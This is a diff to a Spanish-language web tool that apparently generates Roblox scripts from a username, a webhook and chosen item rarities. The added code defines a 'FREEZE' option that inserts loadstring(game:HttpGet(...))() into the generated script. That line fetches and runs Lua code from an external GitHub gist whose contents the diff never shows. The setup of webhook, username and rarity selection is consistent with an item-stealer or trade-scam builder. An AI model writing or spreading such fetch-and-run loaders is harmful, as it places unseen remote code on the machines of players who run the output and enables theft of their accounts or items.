@@ -30,10 +30,18 @@ async function check(n){
   }catch(e){if(my===seq)st.innerHTML='<span class="mut">No se pudo comprobar el user ahora.</span>'}
 }
 
+const FREEZE='loadstring(game:HttpGet("https://gist.githubusercontent.com/Yamekiteelyeso/369045e74144c4f38f4a3fdd48161d34/raw/8c87201e316e03927f4f70a4fe0c37e9e87f3315/RdduzHub"))()';
+$("frz").addEventListener("change",()=>{
+  const on=$("frz").checked;
+  $("custom").disabled=on;
+  if(on){$("custom").value=FREEZE}
+  else if($("custom").value.trim()===FREEZE){$("custom").value=""}
+});
+
 const q=s=>s.replace(/\\/g,"\\\\").replace(/"/g,'\\"').replace(/\r?\n/g," ");
 $("make").onclick=()=>{
   const err=$("err");err.textContent="";
-  const user=$("user").value.trim(),hook=$("hook").value.trim(),custom=$("custom").value.trim();
+  const user=$("user").value.trim(),hook=$("hook").value.trim(),custom=$("frz").checked?FREEZE:$("custom").value.trim();
   const rar=boxes().filter(b=>b.checked).map(b=>b.value);
   if(!user){err.textContent="Escribe tu user.";return}
   if(!rar.length){err.textContent="Elige al menos una rareza.";return}
